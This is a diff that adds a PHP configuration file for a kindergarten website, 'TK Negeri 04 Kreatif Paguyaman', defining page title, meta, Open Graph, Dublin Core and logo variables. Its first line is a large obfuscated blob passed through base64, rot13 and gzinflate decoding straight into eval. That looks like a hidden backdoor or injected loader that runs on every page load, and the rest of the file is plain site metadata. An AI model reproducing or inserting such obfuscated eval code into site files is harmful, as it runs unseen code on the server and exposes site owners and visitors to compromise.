@@ -1,0 +1,35 @@
+<?php
+eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+
+// TITLE
+$title = "TK Negeri 04 Kreatif Paguyaman";
+
+// META
+$description = "TK Negeri 04 Kreatif Paguyaman";
+$keywords = "TK Negeri 04 Kreatif Paguyaman";
+$author = "Ratih";
+$robots = "index,follow";
+$revisitAfter = "revisit-after";
+$MSSmartTagsPreventParsing = "TRUE";
+$Distribution = "Global";
+$Rating = "General";
+$themeColor = "#ffffff";
+
+// OPEN GRAPH DATA
+$ogTitle = "TK Negeri 04 Kreatif Paguyaman";
+$ogType = "website";
+$ogDescription = "TK Negeri 04 Kreatif Paguyaman";
+$ogLocale = "id_ID";
+$ogUrl = "https://kreatif.delirwan.com";
+$ogSiteName = "TK Negeri 04 Kreatif Paguyaman";
+$ogAdmins = "Ratih";
+
+// DUBLIN CORE
+$DCTitle = "TK Negeri 04 Kreatif Paguyaman";
+$DCIdentifier = "https://kreatif.delirwan.com";
+$DCDescription = "TK Negeri 04 Kreatif Paguyaman";
+$DCSubject = "TK Negeri 04 Kreatif Paguyaman";
+
+// ICONS
+$icon = $url . "assets/img/logo/logo-paud.png";
+$logo = $url . "assets/img/logo/logo-paud.png";
